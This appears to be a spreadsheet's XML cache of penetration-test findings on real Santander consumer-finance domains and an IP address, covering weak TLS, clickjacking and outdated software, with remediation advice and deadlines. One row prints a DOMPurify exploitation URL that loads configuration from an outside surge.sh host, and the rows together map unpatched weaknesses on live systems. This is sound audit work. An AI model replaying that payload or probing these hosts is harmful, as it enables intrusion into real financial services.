    <s v="Durante el ejercicio de intrusión se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta &quot;Set-Cookie&quot; de la cookie ‘JSESSIONID’ el atributo “Secure”."/>
    <s v="Se recomienda proteger los identificadores de sesión con el atributo de seguridad &quot;Secure&quot;, evitando que el identificador de sesión sea transmitido por canales no seguros."/>
    <s v="El robo de cookies podría permitir a un usuario malicioso acceder a las sesiones privadas de otros usuarios, suplantando su identidad dentro de la aplicación."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="42"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-665481a2c382686af2c85601"/>
    <s v="SCO-24-CNMPO-001-CO-004"/>
    <x v="27"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="2.5999999046325684"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-05-27T12:50:42"/>
    <n v="756.46479166666541"/>
    <d v="2024-09-24T12:50:42"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que el servidor que aloja el dominio web motor.santanderconsumer.co es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: _x000a_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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="43"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-6673ff5ebb0dea0e40f46cff"/>
    <s v="SCO-24-CNMPO-008-CO-004"/>
    <x v="28"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.5999999046325684"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-20T10:07:26"/>
    <n v="732.57817129629984"/>
    <d v="2024-10-18T10:07:26"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato._x000a_A modo de evidencia, se muestra el resultado de la herramienta &quot;testssl” sobre el servidor afectado aliados.santanderconsumer.co que muestra que el activo es vulnerable a BEAST:"/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible. Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como identificadores de sesión del usuario, credenciales, etc."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="44"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="API Viabilizacion"/>
    <s v="MAN-6669bf04bb0dea0e40ef3709"/>
    <s v="SCO-24-CNMPO-007-CO-001"/>
    <x v="29"/>
    <m/>
    <x v="0"/>
    <s v="Low"/>
    <n v="2.7999999523162842"/>
    <m/>
    <m/>
    <s v="api.premiercredit.co"/>
    <n v="11444"/>
    <m/>
    <d v="2024-06-12T15:30:12"/>
    <n v="740.35402777777927"/>
    <d v="2024-10-10T15:30:12"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-15T00:00:00"/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato."/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible. Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como identificadores de sesión del usuario, credenciales, etc."/>
    <m/>
    <s v="Activo dado de baja"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="45"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="API Viabilizacion"/>
    <s v="MAN-6669bf88bb0dea0e40ef3751"/>
    <s v="SCO-24-CNMPO-007-CO-002"/>
    <x v="25"/>
    <m/>
    <x v="0"/>
    <s v="Low"/>
    <n v="2.7999999523162842"/>
    <s v="CVE-2013-0169"/>
    <m/>
    <s v="api.premiercredit.co"/>
    <n v="11444"/>
    <m/>
    <d v="2024-06-12T15:32:24"/>
    <n v="740.35250000000087"/>
    <d v="2024-10-10T15:32:24"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-15T00:00:00"/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso. _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: •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m/>
    <s v="Activo dado de baja"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="46"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-668e2a9f87e64843c1d54e35"/>
    <s v="SCO-24-CNMPO-010-CO-005"/>
    <x v="30"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.7999999523162842"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <s v="4443"/>
    <m/>
    <d v="2024-07-10T06:30:55"/>
    <n v="712.72853009259416"/>
    <d v="2024-11-07T06:30:55"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación auditada no presenta la cabecera de respuesta X-Frame-Options, permitiendo que la aplicación pueda ser cargada en frames de otro dominio externo al principal. Esta técnica denominada como Clickjacking es muy utilizada en escenarios de Phishing en los que al usuario se le muestra un frame de la aplicación legítima desde un dominio fraudulento controlado por el atacante."/>
    <s v="Se recomienda utilizar la cabecera &quot;X-Frame-Options&quot; en las respuestas HTTP para notificar al navegador los permisos sobre qué dominios pueden cargar las páginas de la aplicación. Actualmente esta funcionalidad se encuentra ampliamente soportada. Seleccionar una de las siguiente opciones según corresponda. _x000a_- Indica al navegador que la página no se debe cargar nunca dentro de otro frame _x000a_X-Frame-Options: DENY _x000a_- Indica al navegador que la página se podrá cargar únicamente en frames pertenecientes al mismo dominio _x000a_X-Frame-Options: SAMEORIGIN _x000a_- Indica al navegador que la página se permite cargar en frames únicamente pertenecientes al dominio indicado _x000a_X-Frame-Options: ALLOW-FROM &lt;origen&gt;_x000a_Adicionalmente, se pueden incluir fragmentos de Javascript en la respuesta que detecten si se encuentra dentro de un frame y cargar la página sin frames. _x000a_El ejemplo más sencillo sería incluir al principio del código HTML de la respuesta lo siguiente: &lt;script&gt;if (top!=self) top.location.href=self.location.href&lt;/script&gt;"/>
    <s v="De no configurar correctamente el servidor y/o la aplicación web para no permitir ataques de Clickjacking, un atacante podría llevar a cabo un secuestro de sesión mediante un previo ataque de Phishing para provocar que el usuario legítimo acceda a la página maliciosa. El riesgo de este tipo de vulnerabilidad se establece como bajo por la dificultad de realizar un ataque con éxito. Para ello, sería necesario dirigir la navegación de un usuario a un sitio controlado por un atacante, posiblemente con una URL similar a la de la aplicación legítima. En ese sitio, una página HTML contendría un frame que carga la página legítima de la aplicación afectada. En dicho caso, por ejemplo, entrarían en juego aspectos tales como el certificado del servidor del atacante y la URL, que provocaría una alerta del navegador al usuario y tendría que aceptar o pasar por alto que no son propios de la aplicación."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="47"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-668e2ae687e64843c1d54e36"/>
    <s v="SCO-24-CNMPO-010-CO-006"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.7999999523162842"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <s v="4443"/>
    <m/>
    <d v="2024-07-10T06:32:06"/>
    <n v="712.72770833333198"/>
    <d v="2024-11-07T06:32:06"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso._x000a__x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: _x000a_•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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="48"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-33c52e56"/>
    <s v="SC-22-CNMPO-12-CO-006"/>
    <x v="31"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.5999999046325684"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2022-11-02T15:31:02"/>
    <n v="1328.3534490740712"/>
    <d v="2023-03-02T15:31:02"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha comprobado que el encabezado “Server” afectado filtra información del servidor web en uso._x000a_La información revelada por este encabezado es:_x000a_• Apache"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la estructura interna de la misma, así como de las tecnologías utilizadas para su desarrollo o de la infraestructura que la sustenta. _x000a_Este tipo de información puede ser accesible a través de las cabeceras de respuesta de la aplicación, mensajes de error y/o páginas por defecto. En particular, se recomienda retirar u ofuscar el encabezado “Server” de la respuesta HTTP."/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de las tecnologías utilizadas para desarrollar la aplicación y/o de la infraestructura utilizada para sustentar la misma. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="49"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-667c3321413b406ff3f83def"/>
    <s v="SCO-24-CNMPO-009-CO-001"/>
    <x v="32"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-26T15:26:25"/>
    <n v="726.35665509258979"/>
    <d v="2024-10-24T15:26:25"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor afectado tiene habilitado el método HTTP TRACE"/>
    <s v="Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea posible. _x000a_Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones de tipo API RESTFUL en las que se necesite su uso. _x000a_Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos HTTP/HTTPS para comunicarse."/>
    <s v="Dependiendo la configuración en el servidor, el uso de ciertos métodos como (PUT, DELETE, TRACE u OPTIONS) podrían permitir a un atacante realizar ciertas opciones como por ejemplo, crear o borrar elementos."/>
    <s v="1° Fecha: 28/02/2025_x000a__x000a_2°Sin fecha"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="50"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-668e2a3387e64843c1d54e34"/>
    <s v="SCO-24-CNMPO-010-CO-004"/>
    <x v="32"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <s v="4443"/>
    <m/>
    <d v="2024-07-10T06:29:07"/>
    <n v="712.72978009259532"/>
    <d v="2024-11-07T06:29:07"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor afectado tiene habilitado el método HTTP TRACE_x000a_A continuación, se muestra la evidencia del uso del método HTTP habilitado en el servidor y considerado como inseguro."/>
    <s v="Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea posible. Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones de tipo API RESTFUL en las que se necesite su uso . Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos HTTP/HTTPS para comunicarse."/>
    <s v="Dependiendo la configuración en el servidor, el uso de ciertos métodos como (PUT, DELETE, TRACE u OPTIONS) podrían permitir a un atacante realizar ciertas opciones como, por ejemplo, crear o borrar elementos."/>
    <s v="1° Fecha: 28/02/2025_x000a__x000a_2°Sin fecha "/>
    <s v="Aun se estan realizando las validaciones correspondientes para realizar la mitigacion "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="51"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-09a476bf"/>
    <s v="SCO-22-CNMPO-006-CO-008"/>
    <x v="33"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <s v="CVE-2019-10097_x000a_CVE-2019-0215_x000a_CVE-2018-17189_x000a_CVE-2022-1292_x000a_CVE-2022-2068_x000a_CVE-2022-2097_x000a_CVE-2022-0778_x000a_CVE-2019-16728"/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U="/>
    <m/>
    <m/>
    <d v="2022-09-12T19:04:33"/>
    <n v="1379.2051736111098"/>
    <d v="2023-01-10T19:04:33"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha observado la presencia de servicios que poseen versiones de software desactualizadas._x000a__x000a_Apache v2.4.37_x000a_openSSL1.1.1k_x000a_QXV0b0ZpbmFuSwagger UI &gt;= v3.14.1 &lt; v3.38.0 _x000a_DOMPurify &lt;= versión 2.2.2)_x000a__x000a_https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=_x000a_https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/feasibility/v1/swagger-ui/_x000a_https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/information/v1/swagger-ui/_x000a_https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/statistics/v1/swagger-ui/_x000a_https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/user_information/v1/swagger-ui/_x000a_https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/vehicle-quote/v1/swagger-ui/_x000a_https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/vehicle/v1/swagger-ui/_x000a__x000a_El payload utilizado para la explotacion de la librería DOMPurify fue el siguiente:_x000a_• https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U=/account/v1/swagger-ui/?configUrl=https://jumpy-floor.surge.sh/test.json"/>
    <s v="Se recomienda analizar la posibilidad de actualizar los servicios afectados a la versión recomendada por el fabricante o bien aplicar todos los parches de seguridad disponibles."/>
    <s v="Un individuo malicioso podría comprometer con mayor facilidad los servicios afectados, ya que las versiones de software asociadas poseen vulnerabilidades y/o debilidades de seguridad previamente reportadas. Las vulnerabilidades mencionadas son de conocimiento público y los detalles de las mismas se encuentran disponibles. En consecuencia, un individuo malicioso podría intentar explotarlas para comprometer la confidencialidad y/o integridad de la información a través de los servidores afectados."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="52"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512d54df74e327f9d0969fe"/>
    <s v="SC-23-CNMPA-03-CO-007"/>
    <x v="34"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="2.7999999523162842"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <s v="4443"/>
    <m/>
    <d v="2023-09-26T12:57:49"/>
    <n v="1000.4598495370374"/>
    <d v="2024-01-24T12:57:49"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones._x000a__x000a_Se muestra el resultado de la herramienta &quot;testssl&quot; que demuestra que el activo es vulnerable a BREACH"/>
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. _x000a_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_x000a_A continuación, se muestra cómo se deshabilita la compresión HTTP para Apache y NGINX: Deshabilitar compresión en Apache: _x000a_• Deshabilite el módulo mod_deflate utilizando el siguiente comando: _x000a_$ sudo a2dismod deflate_x000a_• Reinicie el servidor: _x000a_$ sudo /etc/init.d/apache2 restart_x000a_"/>
    <s v="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
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="53"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512d5d7f74e327f9d0969ff"/>
    <s v="SC-23-CNMPA-03-CO-008"/>
    <x v="25"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="2.7999999523162842"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <s v="4443"/>
    <m/>
    <d v="2023-09-26T13:00:07"/>
    <n v="1000.4582523148129"/>
    <d v="2024-01-24T13:00:07"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es potencialmente vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida."/>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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="54"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-651addbbf74e327f9d0a09b4"/>
    <s v="SC-23-CNMPA-002-CO-011"/>
    <x v="35"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="https://190.85.213.99:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2023-10-02T15:11:55"/>
    <n v="994.36672453703795"/>
    <d v="2024-01-30T15:11:55"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha identificado que se están utilizando protocolos o algoritmos de cifrado que no se consideran lo suficientemente robustos para proteger la información transmitida por el canal de comunicaciones utilizado._x000a_A continuación, se detallan los problemas de seguridad detectados en este ámbito:_x000a_• Uso del protocolo SSLv3_x000a_• Uso del protocolo TLS 1_x000a_• Uso del protocolo TLS 1.0_x000a_• Uso de cifrados con una longitud de clave baja (64 bits + DES, RC2 y RC4)_x000a_• Uso de cifrados obsoletos (Triple DES / IDEA, AES, ARIA etc.)"/>
    <s v="Se recomienda configurar los servicios afectados evitando el uso de algoritmos de cifrado RC4 y RC2 y funciones de hash MD5. Además, se recomienda emplear cifrados considerados seguros (AES-GCM) con una longitud de clave mínima de 128 bits y una función de hash fuerte (SHA1). Al mismo tiempo, es recomendable desactivar el protocolo criptográfico SSL que contiene vulnerabilidades conocidas y utilizar TLS en su versión 1.2 o 1.3."/>
    <s v="Un atacante que pudiera capturar una gran cantidad de datos cifrados podría obtener la clave utilizada para cifrar estos datos pudiendo acceder a la información en texto plano. Algoritmos débiles, que se consideran inseguros, pueden permitir a los usuarios malintencionados atacar el sistema al eludir los controles de seguridad y realizar ataques como Man-in-The-Middle."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="55"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-651ade90f74e327f9d0a09b6"/>
    <s v="SC-23-CNMPA-002-CO-013"/>
    <x v="36"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="https://190.85.213.99:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2023-10-02T15:15:28"/>
    <n v="994.36425925925869"/>
    <d v="2024-01-30T15:15:28"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor SSL remoto no verifica el &quot;padding&quot; del bloque de cifrado cuando se utiliza una suite de cifrado como AES o DES permitiendo descifrar tráfico HTTPS enviado a través del canal cifrado."/>
    <s v="Deshabilitar todos aquellos algoritmos de cifrado basados en SSLv3. En los servicios compatibles con SSLv3, deben habilitar el mecanismo TLS Fallback SCSV, hasta que se pueda deshabilitar el cifrado basado en SSLv3."/>
    <s v="Se ha detectado que es posible utilizar mecanismo de cifrado considerado inseguro en la comunicación con el servidor, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor. Este tipo de vulnerabilidades tiene una complejidad de explotación alta pero podrían llegar a permitir a un atacante comprometer la información transmitida entre el cliente y el servidor."/>
    <s v="1° Fecha: 28/02/2025_x000a__x000a_2°Sin fecha "/>
    <s v="Aun se estan realizando las validaciones correspondientes para realizar la mitigacion "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="56"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-651adee3f74e327f9d0a09b7"/>
    <s v="SC-23-CNMPA-002-CO-014"/>
    <x v="29"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="https://190.85.213.99:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2023-10-02T15:16:51"/>
    <n v="994.36329861111153"/>
    <d v="2024-01-30T15:16:51"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato._x000a_Se muestra el resultado de la herramienta &quot;testssl” sobre el servidor afectado https://190.85.213.99:4443/ que muestra que el activo es vulnerable a BEAST"/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible. Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como identificadores de sesión del usuario, credenciales, etc."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="57"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-651adf3bf74e327f9d0a09b8"/>
    <s v="SC-23-CNMPA-002-CO-015"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="https://190.85.213.99:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2023-10-02T15:18:19"/>
    <n v="994.36228009259503"/>
    <d v="2024-01-30T15:18:19"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="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 _x000a_•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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="58"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-6537dcc2f74e327f9d0bf46a"/>
    <s v="SC-23-CNMPO-006-CO-006"/>
    <x v="30"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2023-10-24T15:03:30"/>
    <n v="972.3725694444438"/>
    <d v="2024-02-21T15:03:30"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-12-05T00:00:00"/>
    <s v="La aplicación auditada no presenta la cabecera de respuesta X-Frame-Options, permitiendo que la aplicación pueda ser cargada en frames de otro dominio externo al principal. Esta técnica denominada como Clickjacking es muy utilizada en escenarios de Phishing en los que al usuario se le muestra un frame de la aplicación legítima desde un dominio fraudulento controlado por el atacante."/>
    <s v="Se recomienda utilizar la cabecera X-Frame-Options en las respuestas HTTP para notificar al navegador los permisos sobre qué dominios pueden cargar las páginas de la aplicación. Actualmente, está funcionalidad se encuentra ampliamente soportada. Seleccionar una de las siguiente opciones según corresponda. _x000a_- Indica al navegador que la página no se debe cargar nunca dentro de otro frame _x000a_• X-Frame-Options: DENY _x000a_- Indica al navegador que la página se podrá cargar únicamente en frames pertenecientes al mismo dominio _x000a_• X-Frame-Options: SAMEORIGIN _x000a_- Indica al navegador que la página se permite cargar en frames únicamente pertenecientes al dominio indicado _x000a_• X-Frame-Options: ALLOW-FROM &lt;origen&gt; _x000a_Adicionalmente, se pueden incluir fragmentos de Javascript en la respuesta que detecten si se encuentra dentro de un frame y cargar la página sin frames. _x000a_El ejemplo más sencillo sería incluir al principio del código HTML de la respuesta lo siguiente: _x000a_• &lt;script&gt;if (top!=self) top.location.href=self.location.href&lt;/script&gt;"/>
